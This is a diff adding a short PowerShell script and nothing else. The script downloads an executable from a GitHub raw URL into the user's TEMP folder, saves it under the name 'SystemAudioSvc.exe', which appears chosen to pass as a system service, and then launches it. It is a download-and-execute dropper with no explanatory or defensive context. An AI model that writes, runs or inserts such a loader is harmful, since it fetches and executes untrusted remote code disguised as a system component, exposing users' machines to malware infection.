@@ -1,0 +1,4 @@
+$url = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/vi2lo.exe"
+$path = "$env:TEMP\SystemAudioSvc.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $path)
+Start-Process $path
